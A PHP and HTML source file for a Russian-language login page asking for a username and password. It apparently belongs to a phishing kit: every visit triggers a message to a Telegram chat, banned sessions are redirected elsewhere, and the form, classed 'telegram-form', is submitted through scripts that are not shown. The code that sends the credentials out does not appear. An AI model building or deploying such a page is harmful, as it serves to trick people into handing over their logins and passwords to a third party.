<?php
require_once './config.php';
require_once './ajax.php';
session_start();
sendMessageToChat($chat_id, 'Новый заход на сайт');
if (isset($_SESSION['ban'])) {
  header("Location: $redirect_url");
  die();
}
?>
<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<style>
    body {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }

    .container {
        max-width: 80%;
    }
</style>

<body>
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <form method="post" class="telegram-form">
                    <h2 class="text-center">Вход</h2>
                    <div class="form-group">
                        <label for="name">Логин</label>
                        <input type="text" id="name" name="name" class="form-control border-bottom" required>
                    </div>
                    <div class="form-group">
                        <label for="pass">Пароль</label>
                        <input type="password" id="pass" name="pass" class="form-control border-bottom" required>
                    </div>
                    <button type="submit" class="btn btn-secondary btn-block">Отправить</button>
                </form>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="./main.js"></script>
</body>

</html>